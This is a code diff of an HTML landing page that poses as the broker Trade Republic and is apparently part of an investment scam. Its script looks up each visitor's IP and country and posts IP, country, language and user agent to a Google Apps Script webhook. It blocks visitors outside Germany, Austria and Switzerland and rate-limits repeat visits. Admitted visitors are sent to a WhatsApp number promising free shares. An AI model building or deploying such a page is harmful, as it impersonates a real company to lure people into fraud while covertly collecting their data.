@@ -7,81 +7,103 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #ffffff;
+      background: #f4f4f4;
       text-align: center;
-      padding: 50px;
+      padding-top: 100px;
+      color: #333;
     }
-    img {
-      max-width: 120px;
+    .message {
+      font-size: 28px;
       margin-bottom: 20px;
     }
-    h1 {
-      font-size: 24px;
-      color: #333;
+    .warning {
+      color: red;
+      font-size: 20px;
+    }
+    .logo {
+      max-width: 200px;
+      margin-bottom: 30px;
     }
   </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Trade_Republic_Logo.svg/512px-Trade_Republic_Logo.svg.png" alt="Trade Republic Logo">
-  <h1 id="message">Willkommen bei Trade Republic</h1>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Trade_Republic_Logo_2021.svg" alt="Trade Republic Logo" class="logo">
+  <div class="message" id="status">Willkommen bei Trade Republic</div>
 
   <script>
-    const allowedCountries = ['DE', 'AT', 'CH'];
-    const webhookUrl = 'https://script.google.com/macros/s/AKfycbxUZUPpwihLRC4UVCPMDOFr64WfWhemdVxWwLqxXFhg2U6w0uBfz5Bl5KKO5w3ipgFP/exec';
-    const redirectUrl = 'https://api.whatsapp.com/send/?phone=4915212163013&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos&type=phone_number&app_absent=0';
+    const GAS_URL = "https://script.google.com/macros/s/AKfycbxUZUPpwihLRC4UVCPMDOFr64WfWhemdVxWwLqxXFhg2U6w0uBfz5Bl5KKO5w3ipgFP/exec";
 
-    
-    const now = Date.now();
-    let visits = JSON.parse(localStorage.getItem('visit_log') || '[]');
-    visits = visits.filter(ts => now - ts < 2 * 60 * 1000); // 2分钟内
-    visits.push(now);
-    localStorage.setItem('visit_log', JSON.stringify(visits));
+    const MAX_VISITS = 20;
+    const TIME_WINDOW = 2 * 60 * 1000; // 2 Minuten
 
-    if (visits.length > 20) {
-      document.getElementById("message").innerText = "Zugriff blockiert: Verdächtige Aktivität erkannt.";
-      throw new Error("Blocked due to too many requests.");
+    function isRateLimited() {
+      const now = Date.now();
+      const visits = JSON.parse(localStorage.getItem("visits") || "[]")
+        .filter(ts => now - ts < TIME_WINDOW);
+
+      visits.push(now);
+      localStorage.setItem("visits", JSON.stringify(visits));
+
+      return visits.length > MAX_VISITS;
     }
 
-    
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        const country = data.country;
-        const ip = data.ip;
-        const device = navigator.userAgent;
-        const language = navigator.language || navigator.userLanguage;
-        const isValid = allowedCountries.includes(country);
-        const status = isValid ? 'valid' : 'invalid';
+    async function getIPData() {
+      const res = await fetch("https://ipapi.co/json");
+      return await res.json();
+    }
 
-        
-        fetch(webhookUrl, {
-          method: 'POST',
-          body: JSON.stringify({
-            country: country,
-            ip: ip,
-            device: device,
-            language: language,
-            time: new Date().toISOString(),
-            status: status
-          }),
-          headers: {
-            'Content-Type': 'application/json'
-          }
+    async function logVisit(payload) {
+      try {
+        await fetch(GAS_URL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
+      } catch (err) {
+        console.error("Fehler beim Senden der Daten", err);
+      }
+    }
 
-       
-        if (isValid) {
-          document.getElementById("message").innerText = "Willkommen! Sie werden weitergeleitet...";
-          setTimeout(() => {
-            window.location.href = redirectUrl;
-          }, 1500);
-        } else {
-          document.getElementById("message").innerText = "Nur für Besucher aus Deutschland, Österreich und der Schweiz verfügbar.";
+    async function main() {
+      const status = document.getElementById("status");
+
+      if (isRateLimited()) {
+        status.innerHTML = "⚠️ Sie wurden wegen ungewöhnlicher Aktivität blockiert.";
+        return;
+      }
+
+      try {
+        const data = await getIPData();
+
+        const allowedCountries = ["Germany", "Austria", "Switzerland"];
+        const country = data.country_name;
+        const allowed = allowedCountries.includes(country);
+
+        const payload = {
+          ip: data.ip || "Unbekannt",
+          country: country || "Unbekannt",
+          language: navigator.language || "Unbekannt",
+          ua: navigator.userAgent || "Unbekannt",
+          valid: allowed ? "Ja" : "Nein"
+        };
+
+        await logVisit(payload);
+
+        if (!allowed) {
+          status.innerHTML = "❌ Ihr Land ist derzeit nicht berechtigt, auf diese Seite zuzugreifen.";
+          return;
         }
-      })
-      .catch(err => {
-        document.getElementById("message").innerText = "Netzwerkfehler. Bitte versuchen Sie es später erneut.";
-      });
+
+        // ✅ 
+        window.location.href = "https://api.whatsapp.com/send/?phone=4915212163013&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
+
+      } catch (err) {
+        status.innerHTML = "⚠️ Fehler beim Laden der Daten.";
+      }
+    }
+
+    main();
   </script>
 </body>
 </html>
